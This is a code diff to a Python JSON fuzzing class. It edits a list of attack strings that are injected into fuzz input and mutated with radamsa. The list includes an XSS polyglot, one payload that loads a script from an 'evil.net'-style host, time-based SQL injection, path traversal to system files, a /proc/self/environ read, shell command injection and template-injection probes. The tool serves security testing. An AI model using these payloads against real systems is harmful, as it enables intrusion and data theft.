@@ -213,24 +213,26 @@ class JSONFactory:
             5: lambda x: "&#%d;" % ord(x),
         }
         attacks = {
-            0: "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/"
-               "</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
-            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF"
-               "(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/ FROM some_table WHERE ex = ample",
-            2: "/../../../../etc/issue",
-            3: "SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/",
+            0: "jaVasCript:/*-/*\\xe2/*\\\\xe2/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/"
+               "</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\%s\)//>\\x3e",
+            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
+               "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
+               "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
+            2: "/../../../../etc/%s",
+            3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
             4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
-               "s.stack=Error().stack,s.src=(/,/+/evil.net/).slice(2),document.documentElement.appendChild(s))//'>",
-            5: "&sleep 5&'\\\"`0&sleep 5&`'",
-            6: "..\\..\\..\\..\\boot.ini",
-            7: "data:text/html,https://a:a.it@www.\\it",
-            8: "file:///proc/self/environ",
-            9: "\\x0d\\xa0BB: mail@mail.it\\x0d\\x0aLocation: www.google.it",
-            10: "./",
-            11: "${7*7}a{{bar}}b",
-            12: "{{'7'*7}}",
+               "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
+            5: "%s&sleep 5&id'\\\"\\xe20&sleep 5&id\\xe2'",
+            6: "..\\..\\..\\..\\%s.ini",
+            7: "data:text/html,https://%s:a.it@www.\\it",
+            8: "file:///proc/self/%s",
+            9: "\\x0d\\xa0BB: %s@mail.it\\x0d\\x0aLocation: www.google.it",
+            10: "./%s",
+            11: "${7*7}a{{%s}}b",
+            12: "{{'%s'*7}}",
         }
-        to_fuzz = attacks[random.randint(0, 12)] + to_fuzz
+        attack = attacks[random.randint(0, 12)]
+        to_fuzz = attack % to_fuzz
         p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
         p2 = subprocess.Popen(["radamsa"], stdin=p1.stdout, stdout=subprocess.PIPE)
         output = p2.communicate()[0]
